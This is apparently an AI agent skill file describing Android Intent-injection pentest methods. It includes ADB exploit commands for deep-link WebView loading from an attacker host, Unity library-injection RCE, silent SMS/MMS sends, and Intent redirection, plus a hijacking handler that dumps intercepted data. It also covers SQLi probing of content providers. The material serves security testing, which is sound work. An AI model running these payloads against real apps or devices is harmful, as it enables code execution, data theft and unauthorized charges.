---
name: android-intent-injection-pentest
description: Android Intent injection vulnerability testing. Use this skill whenever you need to test Android apps for Intent-based attacks including: exported component abuse, deep link WebView injection, Unity RCE via Intent extras, confused-deputy SMS/MMS, Intent redirection (CWE-926), Intent hijacking, or implicit Intent resolution issues. Trigger this skill for any Android pentest involving exported Activities, Services, BroadcastReceivers, ContentProviders, or when analyzing APKs for Intent-related vulnerabilities.
---

# Android Intent Injection Pentest

This skill guides you through testing Android applications for Intent injection vulnerabilities. Intent injection abuses components that accept attacker-controlled Intents or data that is later converted into Intents.

## When to Use This Skill

Use this skill when:
- Testing exported Activities, Services, BroadcastReceivers, or ContentProviders
- Analyzing deep links (custom schemes, VIEW/BROWSABLE intents)
- Investigating WebView security in Android apps
- Testing Unity-based Android applications
- Checking for confused-deputy patterns (SMS/MMS auto-send)
- Looking for Intent redirection vulnerabilities (CWE-926)
- Testing implicit Intent resolution and hijacking risks
- Automating exported component testing

## Quick Start

```bash
# Basic exported Activity test
adb shell am start -n com.target/.ExportedActivity

# Test with extras
adb shell am start -n com.target/.Activity --es key value

# Test deep link
adb shell am start -a android.intent.action.VIEW -d "myscheme://path"
```

## 1. Deep Link → WebView Injection

### Detection

Look for custom scheme deep links that forward URLs to WebViews:

```text
myscheme://com.example.app/web?url=<attacker_url>
```

### Testing

```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Explicit Activity targeting
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```

### What to Check

- HTML/JS executes inside app's WebView context
- JavaScript enabled (check `setJavaScriptEnabled(true)`)
- Exposed `@JavascriptInterface` objects
- WebView cookies/local storage access
- Order-of-checks bugs (JavaScript enabled before URL validation)

### Code Patterns to Find

```java
// Dangerous: JavaScript enabled before validation
webView.getSettings().setJavaScriptEnabled(true);
webView.loadUrl(urlFromIntent);

// Look for inconsistent URL normalization
String url = intent.getStringExtra("url");
// Multiple helpers parsing/splitting/rebuilding URL differently
```

## 2. Unity Runtime RCE (CVE-2025-59489)

### Vulnerability

Unity apps parse Intent extra `unity` as command-line flags. Hidden flag `-xrsdk-pre-init-library` triggers `dlopen()` early in initialization.

### Conditions

- Unity entry Activity is exported (common default)
- For remote: Activity has `BROWSABLE` category
- Attacker can place ELF in permitted linker namespace path

### Local Exploitation

```bash
# Place payload in attacker app's native lib dir
adb shell am start \
  -n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
  -e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```

### Remote One-Click (if BROWSABLE)

```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```

### Bypass Strategy

Target apps that cache attacker-controlled bytes under private storage:
- Permitted paths include `/data` and app's private dir
- Point `-xrsdk-pre-init-library` at path inside app's cache
- Mirrors cache-to-ELF RCE patterns

## 3. Confused-Deputy SMS/MMS (CVE-2025-12080)

### Vulnerability

Default messaging apps auto-execute implicit `ACTION_SENDTO` intents without confirmation UI or `SEND_SMS` permission.

### Testing

```bash
# SMS schemes
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890" --es sms_body "hello"

# MMS schemes
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890" --es sms_body "hello"
```

### Pentest Checklist

- [ ] Resolve `ACTION_SENDTO` to identify default handler
- [ ] Verify if handler shows compose UI or silently sends
- [ ] Test all four schemes: `sms:`, `smsto:`, `mms:`, `mmsto:`
- [ ] Test extras: `sms_body`, `subject` (for MMS)
- [ ] Consider premium-rate numbers for real device testing

### Attack Surface (Wear OS)

- Activities, foreground Services, Tiles, Complications can all trigger
- Abuse can be one-tap or fully silent from background contexts

## 4. Intent Redirection (CWE-926)

### Pattern

Exported entry point forwards incoming Intent without validating source/data:

```java
startActivity(getIntent());
startActivity(intent); // intent from extra like redirect_intent
```

### Code Search Patterns

- `getParcelableExtra("redirect_intent")`
- `getParcelable("intent")`
- `Intent.parseUri(...)`
- Direct `startActivity()`/`startService()`/`sendBroadcast()` on attacker-influenced Intents
- Missing `getCallingPackage()`/`getCallingActivity()` checks

### ADB PoC Templates

```bash
# Proxy Activity forwarding to internal Activity
adb shell am start -n com.target/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'

# Exported Service with redirect_intent
adb shell am startservice -n com.target/.ExportedService \
  --es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'

# Exported Receiver relaying without validation
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
  --es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```

### Real-World CVEs

- CVE-2024-26131 (Element Android): WebView manipulation, PIN bypass
- CVE-2023-44121 (LG ThinQ): System-level effects
- CVE-2023-30728 (Samsung PackageInstallerCHN): Arbitrary file access
- CVE-2022-36837 (Samsung Email): Content leak
- CVE-2021-4438 (React Native SMS): User consent bypass
- CVE-2020-14116 (Xiaomi Mi Browser): Intent abuse

## 5. Intent Hijacking (Implicit Intents)

### Threat Model

App A expects result from App B via implicit Intent. Attacker App C registers matching intent-filter and intercepts the Intent.

### Detection

```bash
# Find implicit Intent usage in decompiled code
grep -r "startActivityForResult" app/
grep -r "registerForActivityResult" app/
grep -r "new Intent(" app/ | grep -v "setComponent\|setPackage"
```

### Attacker PoC Manifest

```xml
<activity android:name=".StealActivity" android:exported="true">
  <intent-filter>
    <action android:name="com.victim.app.ACTION_CALLBACK"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <!-- Constrain to increase match score -->
    <data android:mimeType="application/json"/>
    <data android:scheme="myscheme" android:host="callback"/>
  </intent-filter>
</activity>
```

### Handler Skeleton

```java
public class StealActivity extends Activity {
  @Override protected void onCreate(Bundle b) {
    super.onCreate(b);
    Intent i = getIntent();
    Bundle extras = i.getExtras();
    Uri data = i.getData();
    // Dump/forward sensitive result
    android.util.Log.i("HIJACK", "action="+i.getAction()+" data="+data+" extras="+extras);
    finish();
  }
}
```

### Mitigations

- Use explicit Intents for sensitive flows (`setPackage()`/`setComponent()`)
- Add permission requirements to receiving components
- Validate caller identity
- Tighten Intent filters to only what's needed

## 6. Resolver Debugging

### FLAG_DEBUG_LOG_RESOLUTION

Add this flag to see how Android resolves implicit Intents:

```bash
# 0x00000008 == Intent.FLAG_DEBUG_LOG_RESOLUTION
adb shell am start -a android.media.action.IMAGE_CAPTURE -f 0x00000008

# Inspect resolution in logs
adb logcat | grep -i -E "resolve|Resolver|PackageManager|ActivityTaskManager"
```

### Java Example

```java
Intent intent = new Intent();
intent.setAction("android.media.action.IMAGE_CAPTURE");
intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
startActivityForResult(intent, 42);
```

## 7. Automation: APK Components Inspector

### Tool Overview

Automates discovery of Intent extras from Smali and generates ready-to-run ADB commands.

- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Scans for: `getStringExtra()`, `getIntExtra()`, `getParcelableExtra()`, etc.
- Output: Exact `adb shell am ...` commands with correctly typed flags

### Installation

```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```

### Usage

```bash
python apk-components-inspector.py target.apk
```

### Example Output

```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```

### ADB Extras Cheat Sheet

| Type | Flag | Example |
|------|------|--------|
| String | `--es` | `--es key value` |
| String array | `--esa` | `--esa key v1,v2` |
| Integer | `--ei` | `--ei key 123` |
| Int array | `--eia` | `--eia key 1,2,3` |
| Boolean | `--ez` | `--ez key true` |
| Long | `--el` | `--el key 1234567890` |
| Float | `--ef` | `--ef key 1.23` |
| URI (extra) | `--eu` | `--eu key content://...` |
| Data URI | `-d` | `-d content://...` |
| Component | `--ecn` | `--ecn key com.pkg/.Cls` |
| Null string | `--esn` | `--esn key` |

### Common Flags

- `-a <ACTION>` - Set action
- `-c <CATEGORY>` - Add category
- `-t <MIME>` - Set MIME type
- `-f <FLAGS>` - Set flags
- `--activity-clear-task` - Clear task before starting
- `--activity-new-task` - Start in new task

### ContentProvider Testing

```bash
# Query provider
adb shell cmd content query --uri content://com.target.provider/items

# Insert data
adb shell cmd content insert --uri content://com.target.provider/items --bind name:s:value

# For SQLi probing, vary --projection and --where
adb shell cmd content query --uri content://com.target.provider/items --projection "name,id" --where "id=1"
```

## Testing Workflow

### Phase 1: Reconnaissance

1. **Identify exported components**
   ```bash
   aapt dump xmltree app.apk AndroidManifest.xml | grep -A 5 "android:exported"
   ```

2. **List all intent-filters**
   ```bash
   aapt dump xmltree app.apk AndroidManifest.xml | grep -B 2 -A 10 "intent-filter"
   ```

3. **Check for Unity entry points**
   ```bash
   aapt dump xmltree app.apk AndroidManifest.xml | grep -i unity
   ```

### Phase 2: Component Testing

1. **Run APK Components Inspector**
   ```bash
   python apk-components-inspector.py app.apk | tee adbcommands.txt
   ```

2. **Execute commands interactively**
   ```bash
   python scripts/run_adb_commands.py
   ```

3. **Monitor logs**
   ```bash
   adb logcat -c && adb logcat | grep -i -E "error|exception|intent|activity"
   ```

### Phase 3: Deep Analysis

1. **Decompile and search for patterns**
   ```bash
   apktool d app.apk -o app_decompiled
   grep -r "getStringExtra\|getParcelableExtra\|startActivity" app_decompiled/smali/
   ```

2. **Check for order-of-checks bugs**
   - Look for `setJavaScriptEnabled(true)` before URL validation
   - Multiple URL parsing helpers with inconsistent normalization

3. **Test Intent redirection**
   - Craft `intent:#Intent;...;end` payloads
   - Test with various target components

### Phase 4: Reporting

Document findings with:
- Vulnerable component name
- Attack vector (deep link, extra, implicit intent, etc.)
- ADB PoC command
- Impact assessment
- Mitigation recommendations

## References

- [Android Intent Injection - OverSecured](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [APK Components Inspector](https://github.com/thecybersandeep/apk-components-inspector)
- [Android Intent Documentation](https://developer.android.com/reference/android/content/Intent)
- [Intent Filters Guide](https://developer.android.com/guide/components/intents-filters)
- [CVE-2025-59489 - Unity RCE](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [CVE-2025-12080 - Google Messages Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
